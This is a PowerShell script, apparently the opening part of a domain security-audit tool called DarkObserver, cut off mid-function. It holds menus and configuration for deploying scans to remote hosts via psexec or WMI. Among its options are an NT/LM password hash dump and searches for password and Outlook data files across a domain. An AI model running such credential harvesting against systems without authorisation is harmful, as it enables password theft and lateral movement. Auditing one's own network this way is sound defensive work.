#Requires -Version 2.0

############################################
#		START Menu Functions
############################################ 

Function AsciiArt
{
	switch($(Get-Random(6)))
	{
		0{ Write-Host @'
		
		
                    ______               __        _______ __                                      
                   |   _  \ .---.-.----.|  |--.   |   _   |  |--.-----.-----.----.--.--.-----.----.
                   |.  |   \|  _  |   _||    <    |.  |   |  _  |__ --|  -__|   _|  |  |  -__|   _|
                   |.  |    \___._|__|  |__|__|   |.  |   |_____|_____|_____|__|  \___/|_____|__|  
                   |:  1    /                     |:  1   |                                        
                   |::.. . /                      |::.. . |                                        
                   `------'                       `-------'                                       

				   
'@}
        1{Write-Host @'
		
		
                     _         ()_()      _         .-.     ___   oo_    wWw()_()wWw    wWwwWw()_()  
                   /||_   /)  (O o|OO) .' )      c(O_O)c  (___)_/  _)-< (O)(O o)(O)    (O)(O)(O o)  
                    /o_)(o)(O) |^_\||_/ .'      ,'.---.`, (O)(O)\__ `.  / __)^_\( \    / )/ __)^_\  
                   / |(\ //\\  |(_))   /       / /|_|_|\ \/  _\    `. |/ (  |(_))\ \  / // (  |(_)) 
                   | | ))(__)| |  /||\ \       | \_____/ || |_))   _| (  _) |  / /  \/  (  _) |  /  
                   | |///,-. | )|\(/\)\ `.     '. `---' .`| |_)),-'   |\ \_ )|\\ \ `--' /\ \_ )|\\  
                   \__/-'   ''(/  \)   `._)      `-...-'  (.'-'(_..--'  \__|/  \) `-..-'  \__|/  \)
  
  
'@}
		2{Write-Host @'
  
  
             _____                              _____                                                     
           __|__   |__ ____   _____  __  __   __|__   |__ ______ ______ ______ _____ __    _______ _____   
          |     \     |    \ |     ||  |/ /  /     \     |      >   ___|   ___|     \  \  //   ___|     |  
          |      \    |     \|     \|     \  |     |     |     < `-.`-.|   ___|     \\  \//|   ___|     \  
          |______/  __|__|\__\__|\__\__|\__\ \_____/   __|______>______|______|__|\__\\__/ |______|__|\__\ 
             |_____|                            |_____|                                                    
  
  
'@}
		3{Write-Host @'

		
                \______ \ _____ _______|  | __ \_____  \\_ |__   ______ ______________  __ ___________ 
                 |    |  \\__  \\_  __ \  |/ /  /   |   \| __ \ /  ___// __ \_  __ \  \/ // __ \_  __ \
                 |    `   \/ __ \|  | \/    <  /    |    \ \_\ \\___ \\  ___/|  | \/\   /\  ___/|  | \/
                /_______  (____  /__|  |__|_ \ \_______  /___  /____  >\___  >__|    \_/  \___  >__|   
                        \/     \/           \/         \/    \/     \/     \/                 \/     

		
'@}
		4{Write-Host @'


                               ___                    ___ _
                              /   \__ _ _ __| | __   /___\ |__  ___  ___ _ ____   _____ _ __ 
                             / /\ / _` | '__| |/ /  //  // '_ \/ __|/ _ \ '__\ \ / / _ \ '__|
                            / /_// (_| | |  |   <  / \_//| |_) \__ \  __/ |   \ V /  __/ |   
                           /___,' \__,_|_|  |_|\_\ \___/ |_.__/|___/\___|_|    \_/ \___|_|  


'@}
		5{Write-Host @'

		
                           ____,____,____, __, ,  ____, ____ ____,____,____,__  _,____,____, 
                          (-|  (-/_|(-|__)( |_/  (-/  \(-|__|-(__(-|_,(-|__|-\  /(-|_,(-|__) 
                           _|__//  |,_|  \,_| \,  _\__/,_|__)____)_|__,_|  \,_\/  _|__,_|  \,
                          (   (     (     (      (     (    (    (    (     (    (    (      

		
'@}
 }
}

Function Resize #set console size
{
	if ($host.Name -eq 'ConsoleHost') 
	{
		$Width = 120
		$height = 45
		
		# buffer size can't be smaller than window size
		if ($Width -gt $host.UI.RawUI.BufferSize.Width) {
			$host.UI.RawUI.BufferSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($Width, $host.UI.RawUI.BufferSize.Height)
		}

		# if width is too large, set to max allowed size
		if ($Width -gt $host.UI.RawUI.MaxPhysicalWindowSize.Width) {
			$Width = $host.UI.RawUI.MaxPhysicalWindowSize.Width
		}

		# if height is too large, set to max allowed size
		if ($Height -gt $host.UI.RawUI.MaxPhysicalWindowSize.Height) {
			$Height = $host.UI.RawUI.MaxPhysicalWindowSize.Height
		}

		# set window size
		$host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($Width, $Height)
	}
}

#Change text color to yellow when prompting a user for input
Function ReadYellow
{
	[console]::ForegroundColor = "yellow"
	$input = Read-Host 
	[console]::ForegroundColor = "white"
	Return $input
}

#Make temporary directory for scan data before parsing
Function CreateTempDir
{
	$ErrorActionPreference = "Stop"
	for($i=0; $i -lt 15; $i++)
	{
		try {
			if ((Test-Path $TEMP_DIR -ErrorAction SilentlyContinue) -eq $true)
			{
				Remove-Item -Recurse -Force "$TEMP_DIR\*"
			}
			mkdir -Path $TEMP_DIR -Force | Out-Null
			break
		} catch {
			sleep 1
		}
	}
	if($i -eq 30)
	{
		Write-Host -ForegroundColor Red "Unable to create temporary directory: $TEMP_DIR"
		ExitFunction
	}
}

#Check for admin rights and psexec
Function CheckDependancies
{
	param($PSScriptRoot)
	
	#Check that user is a Domain Admin
	try {
		$admin=([ADSISEARCHER]"samaccountname=$($env:USERNAME)").Findone().Properties.memberof |
		Select-String "Domain Admins"
	} Catch {}

    if($admin)
    { 
        $Script:AdminPrivs = $true
    }
	else {$Script:AdminPrivs = $false}
	
	#Add current directory to path
	$env:path = $env:path+";.\"
	
	#Check for presence of psexec and store to a variable in $scan hash table
    try { 
		if (test-path .\psexec.exe)
		{
			$script:scan.psexec = Get-Command ".\psexec.exe" -ErrorAction Stop
			Return
		}
		elseif($script:scan.psexec = Get-Command "psexec.exe" -ErrorAction Stop){Return}
		
    } Catch {  #psexec not in path. Check in script directory
		if (test-path $PSScriptRoot\psexec.exe)
		{
			$script:scan.psexec = Get-Command "$PSScriptRoot\psexec.exe"
		}
		else
		{
			Write-Warning "Unable to find psexec.exe in your PATH.  Payloads will default to WMI for remote execution"
			Return
		}	
    }
}

#Initial menu presented to start scans
Function DisplayMenu
{
	#keep looping until input is valid
	while($true){
		Write-Host "
Choose scan type:

    [1]  STANDARD
    [2]  ADVANCED

Choice: " -NoNewLine
		$ScanType = ReadYellow
		switch($ScanType)
		{
			1{Clear-Host; if(-not (DisplayStandardMenu)){Return}}
			2{Clear-Host; if(-not (DisplayAdvancedMenu)){Return}}
			"h"{Clear-Host; Return}
			"home"{Clear-Host; Return}
			"x"{ExitFunction}
			"exit"{ExitFunction}
			default{Write-Host -ForegroundColor Red "Invalid Choice: $ScanType"}
		}
	}
}

Function DisplayStandardMenu
{
	Write-Host "
Which scan do you want to perform?

    [0]  ALL
    [1]  User Executable Enumeration
    [2]  USB enumeration
    [3]  Auto-Run disabled
    [4]  Start-up Programs
    [5]  Scheduled tasks
    [6]  Running Processes
    [7]  Driver Query
    [8]  Service Query
    [9]  Network Connections
    [10] Installed Software
    [11] Network Shares
    [12] Network Shares Permissions
    [13] Antivirus Status
    [14] Local accounts
    [15] Domain accounts
		
Choice: " -NoNewLine
	$ScanChoice = ReadYellow
	Write-Host ""
	switch($ScanChoice)
	{
		"h"{Clear-Host; Return $false}
		"home"{Clear-Host; Return $false}
		"x"{ExitFunction}
		"exit"{ExitFunction}
		12{
			#If network shares permissions is chosen make sure that network shares data is present.
			#If Network shares scan has not been run then run it before network shares permissions.
			if(-not ((gci "$OUT_DIR\NetworkShares*.csv") -or (gci "$OUT_DIR\CSV\NetworkShares*.csv" -ErrorAction SilentlyContinue)))
			{				
				$ScanChoice = "11,12"
			}
		}
	}
	ParseMenuChoice $ScanChoice 15 | %{
		$Script:ScanChoiceArray.add($_)|Out-Null
	}
}

Function DisplayAdvancedMenu
{
	While($true)
	{
		Write-Host "
Which scan do you want to perform?

    [1]  File-Type Search
    [2]  Logged on users 
    [3]  Ping Sweep 
    [4]  Hot-Fix Enumeration
    [5]  NT/LM password hash dump (Win7+)
    [6]  File hasher (Win7+)
    [7]  Virus-Total hash analysis
		
Choice: " -NoNewLine
		$AdvScanChoice = ReadYellow

		switch ($AdvScanChoice)
		{
			1{if(-not (FileTypeSearch)){Return}}
			2{if (-not (LoggedOnUsers)){Return}}
			3{if (-not (PingSweep)){Return}}
			4{
				Write-Host
				$Script:ScanChoiceArray.add("16")
				Return
			}
			5{
				Write-Host
				$Script:ScanChoiceArray.add("110")
				Return
			}
			6{
				Write-Host
				$Script:ScanChoiceArray.add("111")
				Return
			}
			7{if (-not (VTHashAnalysis)){Return}}
			
			"h"{Clear-Host; return $false}
			"home"{Clear-Host; return $false}
			"x"{ExitFunction}
			"exit"{ExitFunction}
			default{Write-Host -ForegroundColor Red "Invalid Choice: $ScanType"}
		}
	}
}

Function ParseMenuChoice
{
	param($Choice, $TotalChoices)
	
	#Create a temporary array to store the different comma separated scan choices
	$TempChoiceArray = New-Object System.Collections.ArrayList
	$Choice = $Choice.split(",") | %{$_.trim()}
	
	#if the array only has 1 item do this
	if(-not $Choice.count -or $Choice.count -eq 1)
	{
		$TempChoiceArray.Add($Choice)|out-null
		
		#choice of 0 means perform all scans.  
		if($TempChoiceArray[0] -eq "0")
		{
			$TempChoiceArray.Clear()
			
			#Fill array with values from 1 to total number of choices
			for($i=1; $i -le $TotalChoices; $i++){$TempChoiceArray.Add($i)|out-null}
			Return $TempChoiceArray
		}
	}	
	
	else
	{
		#add each comma separated item to the array
		for($i=0; $i -lt $Choice.count; $i++)
		{
			$TempChoiceArray.Add($Choice[$i]) |out-null
		}
	}

	#step through each choice in TempChoiceArray
	for($i=0; $i -lt $TempChoiceArray.count; $i++)
	{
		#Test if choice contains a "-" representing a range of numbers (i.e. 4-8)
		if ($TempChoiceArray[$i] | select-string "-")
		{
			#split the range and test that they are digits
			$IntRange = ($TempChoiceArray[$i]).split("-")
			for($j=0; $j -le 1; $j++)
			{
				if ( $IntRange[$j] | select-string "^\d$")
				{
					$IntRange[$j] = [convert]::ToInt32($IntRange[$j], 10)
				}
			}
			#fill in the numeric values between the range
			$IntRange=($IntRange[0] .. $IntRange[1])
			for($j=0; $j -lt $IntRange.count; $j++)
			{
				#add each item in the integer range to the temp array
				$TempChoiceArray.Add($IntRange[$j])|out-null
			}
			#remove the item that represents the range from the temp array
			$TempChoiceArray.Remove($TempChoiceArray[$i])|out-null
			
			#restart the loop until all choice ranges have been expanded
			$i = -1
		}
	}
	
	for($i=0; $i -lt $TempChoiceArray.count; $i++)
	{
		#convert to base 10 integer
		$TempChoiceArray[$i] = [convert]::ToInt32($TempChoiceArray[$i], 10) 
	}
	
	#return sorted array
	$TempChoiceArray = $TempChoiceArray | sort
	Return $TempChoiceArray
}

#Get location to save data
Function SetOutFile
{
	param($CurrentChoice)
	$input = ReadYellow
	if(-not $input) #no user input save file in current directory
	{
		#Current choice is users current directory
		if($CurrentChoice -eq $(Get-Location).path)
		{
			$(Get-Location).path+"\Scans${today}"
			$(Get-Location).path+"\Scans${today}_TEMP" 
			$script:OUT_DIR_root = $CurrentChoice
			return
		}
		
		#User changed default choice.  Make sure choice is full path
		else
		{
			$input = [System.IO.Path]::GetFullPath("$CurrentChoice") #full path needed for script to run properly
			"${input}\Scans${today}"
			"${input}\Scans${today}_TEMP"
			$script:OUT_DIR_root = $CurrentChoice
			return
		}
	}
	else #choice changed from currently stored value
	{
		if(-not (Test-Path $input -PathType Container)) #path must be a directory
		{
			Write-Host -ForegroundColor Red "  $input does not exist or is not a directory."
			return $false
		}
		else #path is a directory
		{
			$input = [System.IO.Path]::GetFullPath("$input") #full path needed for script to run properly
			"${input}\Scans${today}"
			"${input}\Scans${today}_TEMP"
			$script:OUT_DIR_root = $input
			return
		}
    }
}

#Set location/create known good files for data parsing
Function SetKnownGood
{
	#known good directory not found create and fill with files
	if(-not (Test-Path "$PSScriptRoot\KnownGood" -PathType Container))
	{
		mkdir "$PSScriptRoot\KnownGood" |Out-Null
		$null|Add-Content "$PSScriptRoot\KnownGood\UserExeSearch.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\USBs.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\StartUpPrograms.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\ScheduledTasks.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\RunningProcs.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\Drivers.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\Services.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\InstalledSoftware.txt"
		$null|Add-Content "$PSScriptRoot\KnownGood\RequiredHotFix.txt"
	}
	
	#Directory is present.  Make sure each data parsing file exists
	if (-not (Test-Path "$PSScriptRoot\KnownGood\UserExeSearch.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\UserExeSearch.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\USBs.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\USBs.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\StartUpPrograms.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\StartUpPrograms.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\ScheduledTasks.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\ScheduledTasks.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\RunningProcs.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\RunningProcs.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\Drivers.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\Drivers.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\Services.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\Services.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\InstalledSoftware.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\InstalledSoftware.txt"
	}
	if (-not (Test-Path "$PSScriptRoot\KnownGood\RequiredHotFix.txt")){
		$null|Add-Content "$PSScriptRoot\KnownGood\RequiredHotFix.txt"
	}

	#Fill known good hash table with paths to data files
	$script:KnownGood = @{
		UserExe = "$PSScriptRoot\KnownGood\UserExeSearch.txt"
		USB = "$PSScriptRoot\KnownGood\USBs.txt"
		StartUpProg = "$PSScriptRoot\KnownGood\StartUpPrograms.txt"
		SchedTasks = "$PSScriptRoot\KnownGood\ScheduledTasks.txt"
		RunningProcs = "$PSScriptRoot\KnownGood\RunningProcs.txt"
		Drivers = "$PSScriptRoot\KnownGood\Drivers.txt"
		Services = "$PSScriptRoot\KnownGood\Services.txt"
		Software = "$PSScriptRoot\KnownGood\InstalledSoftware.txt"
		HotFix = "$PSScriptRoot\KnownGood\RequiredHotFix.txt"}
}

Function help
{
	Write-Host "
Available Options:
  conf[c].......Set scan configuration variables
  set...........View current configuration
  scan[s].......Execute Scan
  home[h].......Return to prompt
  exit[x].......Return to powershell
"
#  set-creds.....Input credentials to use for scan (default is current user)
}

#set the hosts that should be scanned
Function ScanHostsFile
{
	param($CurrentChoice)
	$input = ReadYellow
	if(-not $input){return $CurrentChoice} #no user input return current choice
	
	#generate list of all active hosts in domain
	if($input -eq "ALL") 
	{
		$script:FirstRunComps = $True
		Return $input 
	}
	
	#User input is not valid.  Either does not exist or is not a file
	elseif(-not (Test-Path $input -PathType Leaf))
	{
		Write-Host -ForegroundColor Red "  $input not found"
	}
	
	#User input is valid.  Return user input
	else
	{
		$script:FirstRunComps = $True
		$script:HostFileModTime = (gci $input).LastWriteTime
		Return $input
	}
}

Function OutputFormat
{
	param($CurrentChoice)
	$input = ReadYellow
	if(-not $input){$CurrentChoice; return}
	switch($input)
	{
		"csv"{$input}
		"xls"{$input}
		"xlsx"{$input}
		"xlsb"{$input}
		default{Write-Host -ForegroundColor Red "  Choices are: csv, xls, xlsx, xlsb"; return $false}
	}
}

Function ThreadCount
{
	param($CurrentChoice)
	$ProcNum = (gwmi win32_computersystem).NumberofLogicalProcessors #number of processor cores
	$min=1 #minimum number of threads is 1
	$max=$ProcNum*2 
	if($max -lt 8){$max = 8} #maximum number of threads is twice the number of processor cores or 8, whichever is more.
	$input = ReadYellow
	if(-not $input){[convert]::ToInt32($CurrentChoice); return}
	try{
		$input = [convert]::ToInt32($input) 
		if($input -ge $min -and $input -le $max){$input; return}
		else {Write-Host -ForegroundColor Red "  Choose a number from $min to $max"; return $false}
	} catch {
		Write-Host -ForegroundColor Red "  Choose a number from $min to $max"; return $false
	}
}

Function SetScanDomain
{
	param($CurrentChoice)
	$input = ReadYellow
	if(-not $input)
	{
		if(-not $CurrentChoice){
			Write-Host -ForegroundColor Red "  Domain name cannot be null"
			Return
		}
		$script:DistinguishedName = "DC=$($CurrentChoice.Replace('.',',DC='))" #convert fqdn into distinguished name
		Return $CurrentChoice		
	}

	if ($input.split('.').count -eq 1) #input is not an fqdn
	{
		if(-not $CurrentChoice)
		{
			$fqdn = $input
		}
		else
		{
			for($i=1; $i -lt $CurrentChoice.split('.').count; $i++)
			{
				$root = $root+'.'+$CurrentChoice.split('.')[$i] #strip the first field off of the current domain
			}
			$fqdn = "$input$root" #prepend input to current domain
		}
	}
	
	$script:DistinguishedName = "DC=$($fqdn.Replace('.',',DC='))"

	try {
		if([adsi]::Exists("LDAP://$DistinguishedName")){Return $fqdn}
	} catch {
		if(ReturnFunction $input){Return $True}
		else
		{
			Write-Host -ForegroundColor Red  "  Domain not found: $fqdn"
		}
	} #Finally {$True}
}

Function Config #prompt user for required scan variables
{
	Write-Host 
	
	#Set default values if variables are not already set
	if(-not $ScanHostsFile){$ScanHostsFile="ALL"}
	if(-not $OUT_DIR_root){$OUT_DIR_root=$(Get-Location).path}
	if(-not $OutputFormat){$OutputFormat="xlsb"}
	if(-not $ThreadCount){$ThreadCount = (gwmi win32_computersystem).NumberofLogicalProcessors}
	if(-not $ScanDomain){$ScanDomain = $env:USERDNSDOMAIN}
	
	while($true) #loop until input is valid
	{
		Write-Host "  Domain [$ScanDomain]: " -NoNewLine #set out file
		$ScanDomain_temp = SetScanDomain $ScanDomain
		if($ScanDomain_temp)
		{
			if($ScanDomain_temp -eq $True){Write-Host; Return $False}
			else
			{
				$script:ScanDomain = $ScanDomain_temp
				break
			}
		}
	}
	while($true)
	{
		Write-Host "  Data directory [$OUT_DIR_root]: " -NoNewLine #set out file
		$OUT_DIR_temp,$TEMP_DIR_temp = SetOutFile $OUT_DIR_root
		if($OUT_DIR_temp) #setOutFile was successful
		{
			$script:OUT_DIR, $script:TEMP_DIR = $OUT_DIR_temp, $TEMP_DIR_temp
			$Script:scan.TEMP_DIR = $TEMP_DIR
			$script:SCAN.OUT_DIR = $OUT_DIR
			break
		}
	}
	while($true)
	{
		Write-Host "  Hosts to scan [$ScanHostsFile]: " -NoNewLine
		$ScanHostsFile_temp = ScanHostsFile $ScanHostsFile
		if($ScanHostsFile_temp)
		{
			$script:ScanHostsFile = $ScanHostsFile_temp
			break
		}
	}
	while($true)
	{
		Write-Host "  Output format [$OutputFormat]: " -NoNewLine
		$OutputFormat_temp = OutputFormat $OutputFormat
		if($OutputFormat_temp)
		{
			$script:OutputFormat = $OutputFormat_temp
			break
		}
	}
	while($true)
	{
		Write-Host "  Thread count [$ThreadCount]: " -NoNewLine
		$ThreadCount_temp = ThreadCount $ThreadCount
		if($ThreadCount_temp)
		{
			$script:ThreadCount = $ThreadCount_temp
			$Script:scan.Throttle = $script:ThreadCount
			break
		}
	}
	Write-Host
	Return $True
}

Function Set-Creds #Get different credential than logged on user.  This Functionality is currently not written into this script
{
	try{
		$script:scan.creds = Get-Credential $null -ErrorAction Stop
	} catch {$script:scan.creds = $null}
}

Function CurrentConfig #display currently set scan variables
{	
	#if(-not $scan.creds) {$uname="Default"}
	#else {$uname=$scan.creds.GetNetworkCredential().username}
	if(-not $script:ScanDomain) {$script:ScanDomain=$env:USERDNSDOMAIN}
	Write-Host 
	Write-Host "            Domain: $ScanDomain"
	Write-Host "    Data directory: $OUT_DIR_root" 
	Write-Host "     Hosts to scan: $ScanHostsFile" 
	Write-Host "     Output format: $OutputFormat" 
	Write-Host "      Thread count: $ThreadCount
	"
	#Write-Host "  User Credentials: $uname
	#" 
}

Function DarkObserver #darkobserver command prompt
{
	[console]::ForegroundColor = "white"
	Write-Host -ForegroundColor magenta "DarkObserver> " -NoNewLine
	$Input = Read-Host
	switch($input)
	{
		"set"{CurrentConfig}
		"conf"{Config|out-null}
		"c"{Config|out-null}
		"scan"{Execute}
		"s"{Execute}
		#"set-creds"{Set-Creds}
		"cls"{Clear-Host}
		"exit"{Write-Host ""; ExitFunction}
		"x"{Write-Host ""; ExitFunction}
		default{Help}
	}
}

Function ExitFunction
{
	#Reset colors, clear screen and exit
	[Console]::BackgroundColor = $BackgroundColor
	[Console]::ForegroundColor = $ForegroundColor
	Clear-Host
	exit 0
}

Function ReturnFunction
{
	param($UserInput)

	switch($UserInput)
	{
		"x"{exitfunction}
		"exit"{exitfunction}
		"h"{Return $True}
		"home"{Return $True}
	}
}

############################################
#		END Menu Functions
############################################ 


############################################
#		START Scan Functions
############################################ 

#Set all variables to to used for each scan
Function SetScanTypeVars 
{
	param($Selection) #scan choice
	(get-Date).ToString()
	switch ($Selection) 
    {
        1{
			$Script:Deploy = $true #means this is will copy over a script to be executed with psexec
            $Script:ScanType="user executable search" #used for printing scan status to screen
            $Script:outfile="UserExeSearch$((get-date).tostring("HHmmss")).csv" #file where data will be parsed into
			$Script:scan.RemoteDataFile = "UserExeSearch392125281" #file where data will output to on remote host
			$Script:scan.TimeOut = 240 #number of seconds to wait for scan to complete  during collection
			$Script:scan.PS1Code = $UserExeSearchCode_PS1 #powershell code for windows version 6+
			$Script:scan.BATCode = $UserExeSearchCode_BAT} #batch script for windows version < 6
		2{
			$Script:Deploy = $true
            $Script:ScanType="USB enumeration"
            $Script:outfile="USB_Enumeration$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "USB_Enumeration392125281"
			$Script:scan.TimeOut = 240
			$Script:scan.PS1Code = $USB_EnumerationCode_PS1
			$Script:scan.BATCode = $USB_EnumerationCode_BAT}
		3{
			$Script:Deploy = $true
            $Script:ScanType="auto-run disable query"
            $Script:outfile="AutoRunDisable$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "AutoRunDisable392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $AutoRunDisableCode_PS1
			$Script:scan.BATCode = $AutoRunDisableCode_BAT}
        4{
			$Script:Deploy = $true
            $Script:ScanType="Start-up program query"
            $Script:outfile="StartUpPrograms$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "StartUpPrograms392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $StartUpProgramsCode_PS1
			$Script:scan.BATCode = $StartUpProgramsCode_BAT}
		5{
			$Script:Deploy = $true
            $Script:ScanType="scheduled tasks query"
            $Script:outfile="ScheduledTasks$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "ScheduledTasks392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $ScheduledTasksCode_PS1
			$Script:scan.BATCode = $ScheduledTasksCode_BAT}
        6{
			$Script:Deploy = $true
            $Script:ScanType="running processes query"
            $Script:outfile="RunningProcs$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "RunningProcs392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $RunningProcsCode_PS1
			$Script:scan.BATCode = $RunningProcsCode_BAT}
        7{
			$Script:Deploy = $true
            $Script:ScanType="driver query"
            $Script:outfile="Drivers$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "Drivers392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $QueryDriversCode_PS1
			$Script:scan.BATCode = $QueryDriversCode_BAT}
        8{
			$Script:Deploy = $true
            $Script:ScanType="service query"
            $Script:outfile="Services$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "Services392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $QueryServicesCode_PS1
			$Script:scan.BATCode = $QueryServicesCode_BAT}
			
        9{
			$Script:Deploy = $true
            $Script:ScanType="network connections query"
            $Script:outfile="NetStat$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "Netstat392125281"
			$Script:scan.TimeOut = 600
			$Script:scan.PS1Code = $NetstatCode_PS1
			$Script:scan.BATCode = $NetstatCode_BAT}
        10{
			$Script:Deploy = $true
            $Script:ScanType="installed software query"
            $Script:outfile="Software$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "InstalledSoftware392125281"
			$Script:scan.TimeOut = 240
			$Script:scan.PS1Code = $InstalledSoftwareCode_PS1
			$Script:scan.BATCode = $InstalledSoftwareCode_BAT}  
        11{
			$Script:Deploy = $true
            $Script:ScanType="network shares query"
            $Script:outfile="NetworkShares$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "NetworkShares392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $SharesCode_PS1
			$Script:scan.BATCode = $SharesCode_BAT}
        12{
			$Script:Deploy = $false
			$Script:outfile="NetworkSharesPermissions$((get-date).tostring("HHmmss")).csv"
			NetworkSharesPermissions}
        13{
            #!!!!!!!This check does not work on servers.  Check servers manually!!!!!!
			$Script:Deploy = $true
            $Script:ScanType="antivirus status checks"
            $Script:outfile="AntivirusStatus$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "AntivirusStatus392125281"
			$Script:scan.TimeOut = 120
			$Script:scan.PS1Code = $AntivirusStatusCode_PS1
			$Script:scan.BATCode = $AntivirusStatusCode_BAT}   
		14{
			$Script:Deploy = $true
            $Script:ScanType="local account enumeration"
            $Script:outfile="LocalAccounts$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "LocalAccounts392125281"
			$Script:scan.TimeOut = 900
			$Script:scan.PS1Code = $LocalAccountsCode_PS1
			$Script:scan.BATCode = $LocalAccountsCode_BAT}
        15{
			$Script:Deploy = $false
            $Script:ScanType="user account compliance query"
            $Script:outfile="UserAccounts$((get-date).tostring("HHmmss")).txt"
			Write-Host $(get-Date)
			UserAccountScan}
		16{
			$Script:Deploy = $true
            $Script:ScanType="hot-fix enumeration"
            $Script:outfile="HotFixInfo$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "HotFixData392125281"
			$Script:scan.TimeOut = 240
			$Script:scan.PS1Code = $HotFixCode_PS1
			$Script:scan.BATCode = $HotFixCode_BAT} 
		
		101{
			$Script:Deploy = $true
            $Script:ScanType="image file search"
            $Script:outfile="ImageFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "ImageFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $ImageSearchCode_PS1
			$Script:scan.BATCode = $ImageSearchCode_BAT}
		102{
			$Script:Deploy = $true
            $Script:ScanType="audio file search"
            $Script:outfile="AudioFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "AudioFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $AudioSearchCode_PS1
			$Script:scan.BATCode = $AudioSearchCode_BAT}
		103{
			$Script:Deploy = $true
            $Script:ScanType="video file search"
            $Script:outfile="VideoFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "VideoFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $VideoSearchCode_PS1
			$Script:scan.BATCode = $VideoSearchCode_BAT}
		104{
			$Script:Deploy = $true
            $Script:ScanType="script file search"
            $Script:outfile="ScriptFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "ScriptFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $ScriptSearchCode_PS1
			$Script:scan.BATCode = $ScriptSearchCode_BAT}
		105{
			$Script:Deploy = $true
            $Script:ScanType="executable file search"
            $Script:outfile="ExecutableFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "ExecutableFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $ExecutableSearchCode_PS1
			$Script:scan.BATCode = $ExecutableSearchCode_BAT}
		106{
			$Script:Deploy = $true
            $Script:ScanType="Outlook data file search"
            $Script:outfile="DataFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "DataFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $DataFileSearchCode_PS1
			$Script:scan.BATCode = $DataFileSearchCode_BAT}
		107{
			$Script:Deploy = $true
            $Script:ScanType="password file search"
            $Script:outfile="PasswordFileSearch$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "PasswordFileSearch392125281"
			$Script:scan.TimeOut = 1800
			$Script:scan.PS1Code = $PasswordSearchCode_PS1
			$Script:scan.BATCode = $PasswordSearchCode_BAT}
		110{
			$Script:Deploy = $true
            $Script:ScanType="password hash dump"
            $Script:outfile="HashDump$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "HashDump392125281"
			$Script:scan.TimeOut = 180
			$Script:scan.PS1Code = $PowerDump}
		111{
			$Script:Deploy = $true
            $Script:ScanType="file hasher"
            $Script:outfile="FileHashes$((get-date).tostring("HHmmss")).csv"
			$Script:scan.RemoteDataFile = "hashes392125281"
			$Script:scan.TimeOut = 2700
			$Script:scan.PS1Code = $FileHasher}
		
		
		"h"{return}
		"home"{return}
		"x"{ExitFunction}
		"exit"{ExitFunction}
		
        default{
            Write-Host -ForegroundColor Red "    Invalid Choice: $Selection
            "
            Return $false
        }
    }
	Return $true
}

#Parse through AD search results and return the logon name
Function GetResults
{
	param($results)
	
    Foreach($result in $results)
    {
